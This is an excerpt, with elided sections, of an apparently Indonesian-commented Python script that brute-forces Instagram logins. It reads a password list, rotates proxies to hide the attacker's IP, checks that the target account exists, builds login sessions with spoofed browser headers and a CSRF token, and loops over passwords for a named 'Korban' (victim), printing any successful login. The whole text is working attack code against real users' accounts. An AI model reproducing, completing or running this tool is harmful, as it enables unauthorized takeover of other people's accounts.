		...
		if os.path.isfile(self.passwordsFile):
			with open(self.passwordsFile) as f:
				...
				if (passwordsNumber > 0):
					print ('[*] %s Passwords loads 
successfully' % passwordsNumber)
				else:
					print('File Password Kosong Njinq.')
					Input('[*] Enter Untuk Keluar')
					exit()
		else:
			print ('Please create passwords file named "%s"' % 
self.passwordsFile)
			Input('[*] Enter Untuk Keluar')
			exit()
	...
	def randomProxy(self):
		...
		try:
			print('')
			print('[*] Check new ip...')
			print ('[*] Your public ip: %s' % 
requests.get('http://myexternalip.com/raw', proxies={ "http": proxy, "https": 
proxy },timeout=10.0).text)
	...
	def IsUserExists(self):
		r = requests.get('https://www.instagram.com/%s/?__a=1' % 
self.username) 
	...
	def Login(self, password):
		...
		if len(self.CurrentProxy) > 0:
			sess.proxies = { "http": self.CurrentProxy, "https": 
self.CurrentProxy }

		#build requests headers
		sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 
'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
		sess.headers.update({
...
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
		...
		sess.headers.update({'X-CSRFToken' : 
r.cookies.get_dict()['csrftoken']})
...
instabrute = Instabrute(Input('\r\n\rc1 \r     \033[1;32  Masukin Nama Akun IG 
Korban => '))
...
for password in instabrute.passwords:
	...
	if sess:
		print ('=>Login Sukses Cok %s' % [instabrute.username,password])
	else:
